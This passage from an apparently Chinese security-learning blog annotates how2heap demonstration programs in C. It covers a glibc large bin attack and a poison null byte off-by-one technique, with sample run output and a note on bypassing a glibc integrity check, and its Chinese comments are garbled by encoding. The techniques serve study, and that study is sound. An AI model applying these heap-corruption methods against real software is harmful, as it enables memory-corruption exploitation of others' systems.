class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;And allocate another fastbin chunk in order to avoid consolidating the next large chunk with&quot;</span><br>           <span class="hljs-string">&quot; the first large chunk during the free()\n\n&quot;</span>);<br>    <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x20</span>);<br><br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> *p2 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x500</span>);<br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;Then, we allocate the second large chunk on the heap at: %p\n&quot;</span>, p2 - <span class="hljs-number">2</span>);<br><br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;And allocate another fastbin chunk in order to avoid consolidating the next large chunk with&quot;</span><br>           <span class="hljs-string">&quot; the second large chunk during the free()\n\n&quot;</span>);<br>    <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x20</span>);<br><br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> *p3 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x500</span>);<br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;Finally, we allocate the third large chunk on the heap at: %p\n&quot;</span>, p3 - <span class="hljs-number">2</span>);<br> <br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;And allocate another fastbin chunk in order to avoid consolidating the top chunk with&quot;</span><br>           <span class="hljs-string">&quot; the third large chunk during the free()\n\n&quot;</span>);<br>    <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x20</span>);<br> <span class="hljs-comment">// 0x20çš„å †å—ä¸»è¦ç”¨äºåˆ†å‰²å’Œé˜²æ­¢åˆå¹¶ï¼Œæ— å…·ä½“æ„ä¹‰</span><br>    <span class="hljs-built_in">free</span>(p1);<br>    <span class="hljs-built_in">free</span>(p2);<br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;We free the first and second large chunks now and they will be inserted in the unsorted bin:&quot;</span><br>           <span class="hljs-string">&quot; [ %p &lt;--&gt; %p ]\n\n&quot;</span>, (<span class="hljs-type">void</span> *)(p2 - <span class="hljs-number">2</span>), (<span class="hljs-type">void</span> *)(p2[<span class="hljs-number">0</span>]));<br><span class="hljs-comment">// æ­¤æ—¶ä¼šå°†p1åˆ†å‰²ä¸€å—0x90ï¼Œå¹¶å°†å‰©ä½™çš„å †å—æ”¾å…¥unsorted binä¸­ï¼ŒåŒæ—¶å°†p2æ”¾å…¥large binä¸­</span><br>    <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x90</span>);<br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;Now, we allocate a chunk with a size smaller than the freed first large chunk. This will move the&quot;</span><br>            <span class="hljs-string">&quot; freed second large chunk into the large bin freelist, use parts of the freed first large chunk for allocation&quot;</span><br>            <span class="hljs-string">&quot;, and reinsert the remaining of the freed first large chunk into the unsorted bin:&quot;</span><br>            <span class="hljs-string">&quot; [ %p ]\n\n&quot;</span>, (<span class="hljs-type">void</span> *)((<span class="hljs-type">char</span> *)p1 + <span class="hljs-number">0x90</span>));<br><span class="hljs-comment">// æ­¤æ—¶p3è¢«æ”¾å…¥äº†unsorted binä¸­</span><br>    <span class="hljs-built_in">free</span>(p3);<br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;Now, we free the third large chunk and it will be inserted in the unsorted bin:&quot;</span><br>           <span class="hljs-string">&quot; [ %p &lt;--&gt; %p ]\n\n&quot;</span>, (<span class="hljs-type">void</span> *)(p3 - <span class="hljs-number">2</span>), (<span class="hljs-type">void</span> *)(p3[<span class="hljs-number">0</span>]));<br> <br>    <span class="hljs-comment">//------------VULNERABILITY-----------</span><br><br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;Now emulating a vulnerability that can overwrite the freed second large chunk&#x27;s \&quot;size\&quot;&quot;</span><br>            <span class="hljs-string">&quot; as well as its \&quot;bk\&quot; and \&quot;bk_nextsize\&quot; pointers\n&quot;</span>);<br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;Basically, we decrease the size of the freed second large chunk to force malloc to insert the freed third large chunk&quot;</span><br>            <span class="hljs-string">&quot; at the head of the large bin freelist. To overwrite the stack variables, we set \&quot;bk\&quot; to 16 bytes before stack_var1 and&quot;</span><br>            <span class="hljs-string">&quot; \&quot;bk_nextsize\&quot; to 32 bytes before stack_var2\n\n&quot;</span>);<br><span class="hljs-comment">// ä¿®æ”¹p2çš„å¤´éƒ¨</span><br>    p2[<span class="hljs-number">-1</span>] = <span class="hljs-number">0x3f1</span>;<span class="hljs-comment">//size</span><br>    p2[<span class="hljs-number">0</span>] = <span class="hljs-number">0</span>;<span class="hljs-comment">// fd</span><br>    p2[<span class="hljs-number">2</span>] = <span class="hljs-number">0</span>;<span class="hljs-comment">// fd_nextsize</span><br>    p2[<span class="hljs-number">1</span>] = (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>)(&amp;stack_var1 - <span class="hljs-number">2</span>);<span class="hljs-comment">// bk</span><br>    p2[<span class="hljs-number">3</span>] = (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>)(&amp;stack_var2 - <span class="hljs-number">4</span>);<span class="hljs-comment">// bk_nextsize</span><br><br>    <span class="hljs-comment">//------------------------------------</span><br><span class="hljs-comment">// å°†p3æ”¾å…¥large binä¸­ï¼Œè§¦å‘æ¼æ´</span><br>    <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x90</span>);<br> <br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;Let&#x27;s malloc again, so the freed third large chunk being inserted into the large bin freelist.&quot;</span><br>            <span class="hljs-string">&quot; During this time, targets should have already been rewritten:\n&quot;</span>);<br><span class="hljs-comment">// è¿™æ—¶å€™ä¸¤ä¸ªç›®æ ‡åœ°å€éƒ½è¢«æˆ‘ä»¬å†™å…¥äº†p3å †å—çš„å¤´æŒ‡é’ˆ</span><br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;stack_var1 (%p): %p\n&quot;</span>, &amp;stack_var1, (<span class="hljs-type">void</span> *)stack_var1);<br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;stack_var2 (%p): %p\n&quot;</span>, &amp;stack_var2, (<span class="hljs-type">void</span> *)stack_var2);<br><br>    <span class="hljs-comment">// sanity check</span><br>    assert(stack_var1 != <span class="hljs-number">0</span>);<br>    assert(stack_var2 != <span class="hljs-number">0</span>);<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br><br><br>This file demonstrates large bin attack by writing a large <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> value into <span class="hljs-built_in">stack</span><br>In practice, large bin attack is generally prepared <span class="hljs-keyword">for</span> further attacks, such as rewriting the global variable global_max_fast in libc <span class="hljs-keyword">for</span> further fastbin attack<br><br>Let<span class="hljs-number">&#x27;</span>s first look at the targets we want to rewrite on <span class="hljs-built_in">stack</span>:<br>stack_var1 (<span class="hljs-number">0x7ffc592e96f0</span>): <span class="hljs-number">0</span><br>stack_var2 (<span class="hljs-number">0x7ffc592e96f8</span>): <span class="hljs-number">0</span><br><br>Now, we allocate the first large chunk on the heap at: <span class="hljs-number">0x5591859ec000</span><br>And allocate another fastbin chunk in order to avoid consolidating the next large chunk with the first large chunk during the <span class="hljs-title function_">free</span><span class="hljs-params">()</span><br><br>Then, we allocate the second large chunk on the heap at: 0x5591859ec460<br>And allocate another fastbin chunk in order to avoid consolidating the next large chunk with the second large chunk during the <span class="hljs-title function_">free</span><span class="hljs-params">()</span><br><br>Finally, we allocate the third large chunk on the heap at: 0x5591859ec9a0<br>And allocate another fastbin chunk in order to avoid consolidating the top chunk with the third large chunk during the <span class="hljs-title function_">free</span><span class="hljs-params">()</span><br><br>We <span class="hljs-built_in">free</span> the first and second large chunks now and they will be inserted in the unsorted bin: [ 0x5591859ec460 &lt;--&gt; 0x5591859ec000 ]<br><br>Now, we allocate a chunk with a size smaller than the freed first large chunk. This will move the freed second large chunk into the large bin freelist, use parts of the freed first large chunk <span class="hljs-keyword">for</span> allocation, and reinsert the remaining of the freed first large chunk into the unsorted bin: [ 0x5591859ec0a0 ]<br><br>Now, we <span class="hljs-built_in">free</span> the third large chunk and it will be inserted in the unsorted bin: [ 0x5591859ec9a0 &lt;--&gt; 0x5591859ec0a0 ]<br><br>Now emulating a vulnerability that can overwrite the freed second large chunk&#x27;s &quot;size&quot; as well as its &quot;bk&quot; and &quot;bk_nextsize&quot; pointers<br>Basically, we decrease the size of the freed second large chunk to force <span class="hljs-built_in">malloc</span> to insert the freed third large chunk at the head of the large bin freelist. To overwrite the <span class="hljs-built_in">stack</span> variables, we <span class="hljs-built_in">set</span> &quot;bk&quot; to 16 bytes before stack_var1 and &quot;bk_nextsize&quot; to 32 bytes before stack_var2<br><br>Let&#x27;s <span class="hljs-built_in">malloc</span> again, so the freed third large chunk being inserted into the large bin freelist. During this time, targets should have already been rewritten:<br><span class="hljs-title function_">stack_var1</span> <span class="hljs-params">(<span class="hljs-number">0x7ffc592e96f0</span>)</span>: 0x5591859ec9a0<br><span class="hljs-title function_">stack_var2</span> <span class="hljs-params">(<span class="hljs-number">0x7ffc592e96f8</span>)</span>: 0x5591859ec9a0<br></code></pre></td></tr></table></figure><p>æ€»ç»“ä¸€ä¸‹ï¼Œæˆ‘ä»¬æ„é€ çš„ä¸»è¦æ•°æ®å¦‚ä¸‹ï¼š</p><ul><li><code>large_chunk_1.size &lt; large_chunk_2.size</code></li><li><code>large_chunk_1.bk = (unsigned long)(&amp;stack_var1 - 2)</code></li><li><code>large_chunk_1.bk_nextsize = (unsigned long)(&amp;stack_var2 - 4)</code></li></ul><h2 id="Off-By-One"><a href="#Off-By-One" class="headerlink" title="Off_By_One"></a>Off_By_One</h2><h3 id="poison-null-byte"><a href="#poison-null-byte" class="headerlink" title="poison_null_byte"></a>poison_null_byte</h3><p>é€šè¿‡å°†è¢«é‡Šæ”¾çš„å †å—çš„sizeä½ä½æ”¹ä¸º0ä½¿å…¶æ”¶ç¼©ï¼Œè¿™æ ·å†æ¬¡åˆ†é…çš„æ—¶å€™ä¸‹ä¸€ä¸ªå †å—çš„<code>pre_size</code>æ— æ³•å¾—åˆ°æ›´æ–°ï¼Œè€Œç”±äºé‡Šæ”¾å †å—çš„æ—¶å€™ï¼Œä¼šé€šè¿‡å…¶<code>pre_size</code>æ‰¾åˆ°ä¸Šä¸€ä¸ªå †å—è¿›è¡Œunlinkï¼Œè¿™æ ·å°±ä¼šé€ æˆå †å—é‡å ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdint.h&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;malloc.h&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;assert.h&gt;</span></span><br><br><br><br><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br><br>&#123;<br><br>setbuf(<span class="hljs-built_in">stdin</span>, <span class="hljs-literal">NULL</span>);<br><br>setbuf(<span class="hljs-built_in">stdout</span>, <span class="hljs-literal">NULL</span>);<br><br><br><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Welcome to poison null byte 2.0!\n&quot;</span>);<br><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Tested in Ubuntu 16.04 64bit.\n&quot;</span>);<br><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;This technique only works with disabled tcache-option for glibc, see build_glibc.sh for build instructions.\n&quot;</span>);<br><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;This technique can be used when you have an off-by-one into a malloc&#x27;ed region with a null byte.\n&quot;</span>);<br><br><br><br><span class="hljs-type">uint8_t</span>* a;<br><br><span class="hljs-type">uint8_t</span>* b;<br><br><span class="hljs-type">uint8_t</span>* c;<br><br><span class="hljs-type">uint8_t</span>* b1;<br><br><span class="hljs-type">uint8_t</span>* b2;<br><br><span class="hljs-type">uint8_t</span>* d;<br><br><span class="hljs-type">void</span> *barrier;<br><br><br><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;We allocate 0x100 bytes for &#x27;a&#x27;.\n&quot;</span>);<br><br>a = (<span class="hljs-type">uint8_t</span>*) <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x100</span>);<br><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;a: %p\n&quot;</span>, a);<br><br><span class="hljs-type">int</span> real_a_size = malloc_usable_size(a);<br><span class="hljs-comment">// æˆ‘ä»¬æƒ³è¦æº¢å‡ºaï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±éœ€è¦çŸ¥é“açš„çœŸå®å¤§å°</span><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Since we want to overflow &#x27;a&#x27;, we need to know the &#x27;real&#x27; size of &#x27;a&#x27; &quot;</span><br><br><span class="hljs-string">&quot;(it may be more than 0x100 because of rounding): %#x\n&quot;</span>, real_a_size);<br><br><br><br><span class="hljs-comment">/* chunk size attribute cannot have a least significant byte with a value of 0x00.</span><br><span class="hljs-comment"></span><br><span class="hljs-comment"> * the least significant byte of this will be 0x10, because the size of the chunk includes</span><br><span class="hljs-comment"></span><br><span class="hljs-comment"> * the amount requested plus some amount required for the metadata. */</span><br><br>b = (<span class="hljs-type">uint8_t</span>*) <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x200</span>);<br><br><br><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;b: %p\n&quot;</span>, b);<br><br><br><br>c = (<span class="hljs-type">uint8_t</span>*) <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x100</span>);<br><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;c: %p\n&quot;</span>, c);<br><br><br><br>barrier =  <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x100</span>);<br><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;We allocate a barrier at %p, so that c is not consolidated with the top-chunk when freed.\n&quot;</span><br><span class="hljs-comment">// barrieræ˜¯ä¸ºäº†é˜²æ­¢å †å—cä¸top chunkåˆå¹¶</span><br><span class="hljs-string">&quot;The barrier is not strictly necessary, but makes things less confusing\n&quot;</span>, barrier);<br><br><br><br><span class="hljs-type">uint64_t</span>* b_size_ptr = (<span class="hljs-type">uint64_t</span>*)(b - <span class="hljs-number">8</span>);<br><br><br><br><span class="hljs-comment">// added fix for size==prev_size(next_chunk) check in newer versions of glibc</span><br><br><span class="hljs-comment">// https://sourceware.org/git/?p=glibc.git;a=commitdiff;h=17f487b7afa7cd6c316040f3e6c86dc96b2eec30</span><br><br><span class="hljs-comment">// this added check requires we are allowed to have null pointers in b (not just a c string)</span><br><br><span class="hljs-comment">//*(size_t*)(b+0x1f0) = 0x200;</span><br><span class="hljs-comment">// glibc2.26ä¸­å¯¹é‡Šæ”¾çš„å½“å‰å †å—å¤§å°å’Œä¸‹ä¸€ä¸ªå †å—çš„prev_sizeçš„å¤§å°ä½œæ¯”è¾ƒä»¥å¯¹æŠ—å•å­—èŠ‚æº¢å‡º</span><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;In newer versions of glibc we will need to have our updated size inside b itself to pass &quot;</span><br><br><span class="hljs-string">&quot;the check &#x27;chunksize(P) != prev_size (next_chunk(P))&#x27;\n&quot;</span>);<br><br><span class="hljs-comment">// we set this location to 0x200 since 0x200 == (0x211 &amp; 0xff00)</span><br><br><span class="hljs-comment">// which is the value of b.size after its first byte has been overwritten with a NULL byte</span><br><br>*(<span class="hljs-type">size_t</span>*)(b+<span class="hljs-number">0x1f0</span>) = <span class="hljs-number">0x200</span>;<br><br><br><span class="hljs-comment">// è¿™é¡¹æŠ€æœ¯ä¼šç”¨äºæº¢å‡ºæ”¹å†™ä¸€ä¸ªé‡Šæ”¾çš„å †å—</span><br><span class="hljs-comment">// this technique works by overwriting the size metadata of a free chunk</span><br><br><span class="hljs-built_in">free</span>(b);<br><br><br><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;b.size: %#lx\n&quot;</span>, *b_size_ptr);<br><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;b.size is: (0x200 + 0x10) | prev_in_use\n&quot;</span>);<br><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;We overflow &#x27;a&#x27; with a single null byte into the metadata of &#x27;b&#x27;\n&quot;</span>);<br><span class="hljs-comment">// ä½¿bçš„å¤§å°æ”¶ç¼©</span><br>a[real_a_size] = <span class="hljs-number">0</span>; <span class="hljs-comment">// &lt;--- THIS IS THE &quot;EXPLOITED BUG&quot;</span><br><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;b.size: %#lx\n&quot;</span>, *b_size_ptr);<br><br><br><br><span class="hljs-type">uint64_t</span>* c_prev_size_ptr = ((<span class="hljs-type">uint64_t</span>*)c)<span class="hljs-number">-2</span>;<br><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;c.prev_size is %#lx\n&quot;</span>,*c_prev_size_ptr);<br><br><br><br><span class="hljs-comment">// This malloc will result in a call to unlink on the chunk where b was.</span><br><br><span class="hljs-comment">// The added check (commit id: 17f487b), if not properly handled as we did before,</span><br><br><span class="hljs-comment">// will detect the heap corruption now.</span><br><br><span class="hljs-comment">// The check is this: chunksize(P) != prev_size (next_chunk(P)) where</span><br><span class="hljs-comment">// è¿™é‡Œæˆ‘ä»¬çœ‹åˆ°bçš„sizeä¸º0x200ï¼ˆè¢«ä¿®æ”¹ä¹‹å‰æ˜¯0x210ï¼‰</span><br><span class="hljs-comment">// P == b-0x10, chunksize(P) == *(b-0x10+0x8) == 0x200 (was 0x210 before the overflow)</span><br><span class="hljs-comment">// ä¸‹ä¸€ä¸ªchunkçš„ä½ç½®æ‰€åœ¨</span><br><span class="hljs-comment">// next_chunk(P) == b-0x10+0x200 == b+0x1f0</span><br><span class="hljs-comment">// ä¸ºäº†ç»•è¿‡æ£€æŸ¥ï¼Œæˆ‘ä»¬éœ€è¦åœ¨ä¸‹ä¸€ä¸ªchunkçš„pre_siveå†™ä¸Šæˆ‘ä»¬å †å—bçš„å¤§å°</span><br><span class="hljs-comment">// prev_size (next_chunk(P)) == *(b+0x1f0) == 0x200</span><br><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;We will pass the check since chunksize(P) == %#lx == %#lx == prev_size (next_chunk(P))\n&quot;</span>,<br><br>*((<span class="hljs-type">size_t</span>*)(b<span class="hljs-number">-0x8</span>)), *(<span class="hljs-type">size_t</span>*)(b<span class="hljs-number">-0x10</span> + *((<span class="hljs-type">size_t</span>*)(b<span class="hljs-number">-0x8</span>))));<br><br>b1 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x100</span>);<br><br><br><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;b1: %p\n&quot;</span>,b1);<br><span class="hljs-comment">// ç°åœ¨æˆ‘ä»¬ç”³è¯·çš„b1ä¼šåœ¨bæ‰€åœ¨çš„ä½ç½®</span><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Now we malloc &#x27;b1&#x27;. It will be placed where &#x27;b&#x27; was. &quot;</span><br><span class="hljs-comment">// æœ¬è¯¥chunk cçš„pre_sizeåº”è¯¥è¢«æ›´æ–°ï¼Œä½†æ˜¯å®é™…ä¸Šæ²¡æœ‰</span><br><span class="hljs-string">&quot;At this point c.prev_size should have been updated, but it was not: %#lx\n&quot;</span>,*c_prev_size_ptr);<br><span class="hljs-comment">// äº‹å®ä¸Šï¼Œåœ¨chunk cçš„ä¸Šæ–¹0x10åç§»å¤„çš„åœ°æ–¹æ›´æ–°äº†pre_sizeï¼Œå³ä¸º0xf0</span><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Interestingly, the updated value of c.prev_size has been written 0x10 bytes &quot;</span><br><br><span class="hljs-string">&quot;before c.prev_size: %lx\n&quot;</span>,*(((<span class="hljs-type">uint64_t</span>*)c)<span class="hljs-number">-4</span>));<br><span class="hljs-comment">// è¿™é‡Œæˆ‘ä»¬å°†ç”³è¯·å³å°†è¢«è¦†ç›–çš„å †å—</span><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;We malloc &#x27;b2&#x27;, our &#x27;victim&#x27; chunk.\n&quot;</span>);<br><br><span class="hljs-comment">// Typically b2 (the victim) will be a structure with valuable pointers that we want to control</span><br><br><br><br>b2 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x80</span>);<br><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;b2: %p\n&quot;</span>,b2);<br><br><br><br><span class="hljs-built_in">memset</span>(b2,<span class="hljs-string">&#x27;B&#x27;</span>,<span class="hljs-number">0x80</span>);<br><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Current b2 content:\n%s\n&quot;</span>,b2);<br><br><br><span class="hljs-comment">// å½“æˆ‘ä»¬free b1å’Œcæ—¶ï¼Œå°†ä¼šè·³è¿‡b2ç›´æ¥åˆå¹¶ï¼Œå†æ¬¡åˆ†é…æ—¶ï¼Œå°±ä¼šäº§ç”Ÿå †å—é‡å </span><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Now we free &#x27;b1&#x27; and &#x27;c&#x27;: this will consolidate the chunks &#x27;b1&#x27; and &#x27;c&#x27; (forgetting about &#x27;b2&#x27;).\n&quot;</span>);<br><br><br><br><span class="hljs-built_in">free</span>(b1);<br><br><span class="hljs-built_in">free</span>(c);<br><br><br><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Finally, we allocate &#x27;d&#x27;, overlapping &#x27;b2&#x27;.\n&quot;</span>);<br><br>d = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x300</span>);<br><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;d: %p\n&quot;</span>,d);<br><br><br><span class="hljs-comment">// ç°åœ¨å †å—då’Œb2é‡å </span><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Now &#x27;d&#x27; and &#x27;b2&#x27; overlap.\n&quot;</span>);<br><br><span class="hljs-built_in">memset</span>(d,<span class="hljs-string">&#x27;D&#x27;</span>,<span class="hljs-number">0x300</span>);<br><br><br><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;New b2 content:\n%s\n&quot;</span>,b2);<br><br><br><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Thanks to https://www.contextis.com/resources/white-papers/glibc-adventures-the-forgotten-chunks&quot;</span><br><br><span class="hljs-string">&quot;for the clear explanation of this technique.\n&quot;</span>);<br><br><br><br>assert(<span class="hljs-built_in">strstr</span>(b2, <span class="hljs-string">&quot;DDDDDDDDDDDD&quot;</span>));<br><br>&#125;<br><br><br>zyy@zyy-virtual-machine:~/pwn/how2heap/off_by_one$ 